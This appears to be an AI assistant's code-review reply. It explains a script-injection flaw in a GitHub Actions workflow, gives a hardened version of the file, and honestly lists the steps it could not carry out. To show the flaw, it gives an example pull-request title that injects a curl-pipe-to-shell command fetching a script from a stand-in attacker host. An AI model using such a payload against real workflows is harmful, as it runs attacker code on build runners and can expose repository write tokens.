That's not safe. `.github/workflows/deploy.yml:14` is a script injection:

```yaml
- run: echo "Title is ${{ github.event.pull_request.title }}"
```

GitHub pastes `${{ }}` values into the script before the shell runs. Anyone who can open a pull request chooses the title, so a title like `"; curl https://evil.example/x.sh | sh; echo "` runs their own commands on the runner. Two other things in this file make it worse:

- **`permissions: write-all`** means the injected code gets a token that can write to almost everything in the repo.
- **`actions/checkout@v4`** leaves that token in `.git/config` (`persist-credentials` defaults to true). It's also a tag that can be moved, not a pinned commit.

For pull requests from forks, GitHub cuts the token down to read-only and withholds secrets, which limits the damage. Pull requests opened from branches in this repo get the full write token.

## The fix

I couldn't apply this myself: this session only gave me tools to read files, not to edit them or run commands. Here is the corrected file for `.github/workflows/deploy.yml`:

```yaml
---
name: deploy

on:
  pull_request:

permissions: {}

jobs:
  deploy:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    permissions:
      contents: read
    steps:
      - uses: actions/checkout@<SHA> # <version>
        with:
          persist-credentials: false

      - name: Report the pull request title
        env:
          PR_TITLE: ${{ github.event.pull_request.title }}
        run: printf 'Title is %s\n' "$PR_TITLE"
```

What changed:
- **The title now goes through `env:`.** The shell reads it as a quoted variable, so its contents are only ever data, never commands. `printf '%s'` also avoids `echo` misreading a title that starts with `-`.
- **Permissions:** no token access by default, and the job gets only `contents: read`. If the job really deploys and needs more, add just those scopes to the job, with a comment explaining why.
- **`persist-credentials: false`** stops checkout leaving the token on disk.
- **`timeout-minutes: 10`** replaces the default limit of 6 hours.

## Still to do

1. **Pin checkout to a commit.** I couldn't look one up, and I won't write a commit ID from memory. Run:
   ```sh
   gh api repos/actions/checkout/releases/latest --jq .tag_name
   gh api repos/actions/checkout/commits/refs/tags/<tag> --jq .sha
   ```
   Then put the result in `<SHA> # <version>`. That will probably be a newer major version than v4, so read its release notes first.
2. **Run the checks.** I haven't run any: run `actionlint` and `uvx "zizmor@1.31.1" --persona=pedantic .`, both of which should come back clean.
3. **Check the trigger.** A workflow named `deploy` running on `pull_request` is unusual. If it's meant to deploy, it should probably run on `push` to the main branch, or go through a protected environment, rather than run on every pull request.
